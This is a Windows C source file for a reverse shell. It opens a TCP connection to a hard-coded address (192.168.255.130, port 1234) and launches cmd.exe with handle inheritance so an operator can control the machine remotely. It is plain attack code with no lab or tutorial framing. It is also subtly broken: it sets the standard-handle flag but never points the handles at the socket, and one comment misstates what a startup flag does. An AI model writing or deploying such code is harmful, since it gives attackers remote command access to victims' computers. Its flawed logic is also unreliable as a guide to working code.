#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

int main() {
    int result;
    int receive;
    SOCKET shell;
    struct sockaddr_in shell_address;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char receiveserver[512];
    int connection;
    char const ip_address[] = "192.168.255.130";
    int const port = 1234;

    // Initialize winsock
    result = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (result != 0) {
        printf("WSAStartup() failed %d", result);
        return 1;
    }

    // Create a socket for TCP connection
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (shell == INVALID_SOCKET) {
        printf("WSASocket() failed %d", WSAGetLastError());
        return 1;
    }

    // Configure server address
    shell_address.sin_addr.s_addr = inet_addr(ip_address);
    shell_address.sin_port = htons(port);
    shell_address.sin_family = AF_INET;

    // Connect to the server
    connection = WSAConnect(shell, (SOCKADDR*)&shell_address, sizeof(shell_address), NULL, NULL, NULL, NULL);

    if (connection == SOCKET_ERROR) {
        printf("WSAConnect() failed %d", WSAGetLastError());
        return 1;
    }

    // Receive data from the server
    receive = recv(shell, receiveserver, sizeof(receiveserver), 0);
    if (receive == SOCKET_ERROR) {
        printf("recv() failed %d", WSAGetLastError());
        return 1;
    }

    // Zero out the memory of the STARTUPINFO structure to ensure it has a clean state
    memset(&si, 0, sizeof(si));

    // Set the size of the STARTUPINFO structure to be passed to CreateProcess
    // This is required by the API to correctly understand the structure's size
    si.cb = sizeof(si);

    // Set the flags for the process startup:
    // STARTF_USESTDHANDLES: This flag indicates that we will be using the standard input, output, and error handles.
    // STARTF_USESHOWWINDOW: This flag indicates that the window should be shown when the process is launched.
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);


    // Create a new process (cmd.exe)
    result = CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    if (result == 0) {
        printf("CreateProcessA() failed %d", GetLastError());
        return 1;
    }

    // Wait for the process to finish
    DWORD end = WaitForSingleObject(pi.hProcess, INFINITE);
    if (end == WAIT_FAILED) {
        printf("WaitForSingleObject() failed %d", GetLastError());
        return 1;
    }

    // Close process handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Clear the receiveserver buffer
    memset(receiveserver, 0, sizeof(receiveserver));

    // Close the socket and clean up Winsock
    closesocket(shell);
    WSACleanup();

    return 0;
}
